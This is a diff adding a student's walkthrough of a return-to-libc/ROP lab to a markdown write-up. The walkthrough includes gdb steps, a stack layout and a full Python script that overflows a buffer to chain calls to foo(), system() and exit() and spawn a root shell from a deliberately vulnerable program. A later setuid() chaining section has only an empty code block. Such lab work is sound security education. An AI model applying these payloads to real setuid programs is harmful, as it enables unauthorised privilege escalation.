@@ -347,14 +347,146 @@ An attacker constructs a payload consisting of a series of gadgets to achieve th
 The ROP technique has gained significant popularity due to its effectiveness against modern security measures, such as NX and DEP, as it leverages existing code rather than injecting new code into protected memory regions. However, it requires a deep understanding of the target system's memory layout and instruction set to identify suitable gadgets and construct a successful ROP payload.
 
 #### Invoke foo() 10 times before spawing a shell
-There are many ways to solve the problem in Task 4. Another way is to invoke setuid(0) before invoking
-system(). The setuid(0) call sets both real user ID and effective user ID to 0, turning the process
-into a non-Set-UID one (it still has the root privilege). This approach requires us to chain two functions
-together. The approach was generalized to chaining multiple functions together, and was further generalized
-to chain multiple pieces of code together. This led to the Return-Oriented Programming (ROP).
-Using ROP to solve the problem in Task 4 is quite sophisticated, and it is beyond the scope of this lab.
-However, we do want to give students a taste of ROP, asking them to work on a special case of ROP. In the
-retlib.c program, there is a function called foo(), which is never called in the program. That function
-is intended for this task. Your job is to exploit the buffer-overflow problem in the program, so when the
-program returns from the bof() function, it invokes foo() 10 times, before giving you the root shell. In
-your lab report, you need to describe how your input is constructed. Here is what the results will look like.
+
+This task asks students to work on a special case of ROP. In the vulnerable program, there is a function called foo(), which is never called in the program. That function
+is intended for this task. The student's job is to exploit the buffer-overflow problem in the program, so when the program returns from the bof() function, it invokes foo() 10 times, before spawing a shell.
+
+The stack will be built as:
+
+```
+Address of the /bin/sh string
+Address of the exit() function
+Address of the system() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function
+Address of the foo() function (this will overwrite the original return address)
+```
+
+The address of `foo()` can be obtained by runnning the vulnerable program in gdb and executing the following:
+
+```asssembly
+b main
+run
+p foo
+```
+
+The exploit can be created using the following python code
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+# Record the addresses
+system_addr = 0xf7e12420        # The address of system()
+exit_addr   = 0xf7e04f80        # The address of exit()
+sh_addr     = 0xf7f5c352        # The address of "/bin/sh"
+foo_addr    = 0x565562b0        # The address of foo()
+
+###########################################################################
+# The stack is built the following way from high address to low address:  #
+# Address of the /bin/sh string                                           #
+# Address of the exit() function                                          #
+# Address of the system() function                                        #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+# Address of the foo() function                                           #
+###########################################################################
+
+# $ebp - &buffer = 22
+ret = 22 + 4
+
+# build the stack
+content[ret:ret+4]     = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+4:ret+8]   = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+8:ret+12]  = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+12:ret+16] = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+16:ret+20] = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+20:ret+24] = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+24:ret+28] = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+28:ret+32] = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+32:ret+36] = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+36:ret+40] = (foo_addr).to_bytes(4,byteorder='little')
+content[ret+40:ret+44] = (system_addr).to_bytes(4,byteorder='little')
+content[ret+44:ret+48] = (exit_addr).to_bytes(4,byteorder='little')
+content[ret+48:ret+52] = (sh_addr).to_bytes(4,byteorder='little')
+
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+```
+
+When the vulnerable program is run, we see that the exploit is successful and we get a taste of rop
+
+**image**
+
+
+#### Chain setuid() and system()
+
+One way to solve the problem of deafeating shell's countermeasure is to invoke setuid(0) before invoking system(). This approach requires us to chain two functions
+together.
+
+The stack will be built as:
+
+```
+Address of the exit() function
+Address of arg[0] for system() function
+pop; ret
+Address of the system() function
+Address arg[0] for setuid() function
+pop; ret
+Address of the setuid() function (this will overwrite the original return address)
+```
+
+we can use `ropgadget` command while debugging the vulnerable program to get the address of the gadget we are interested in using
+
+**image**
+
+Since both `setuid()` and `system()` take one argument, we are interested in the address of `popret` gadget.
+- one argumet:    popret
+- two argumets:   pop2ret
+- three argumets: pop3ret
+- four argumets:  pop4ret
+
+The address of `system()` and `setuid()` can be obtained by runnning the vulnerable program in gdb and executing the following:
+
+```asssembly
+b main
+run
+p system
+p setuid
+```
+
+The exploit can be created using the following python code
+
+```python
+```
+
+<br>
+
+Thanks for reading.
+
+<details>
+<summary>References</summary>
+
+[Red Team Notes - return-to-libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
+[Red Team Notes - ROP](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming)
+
+</details>
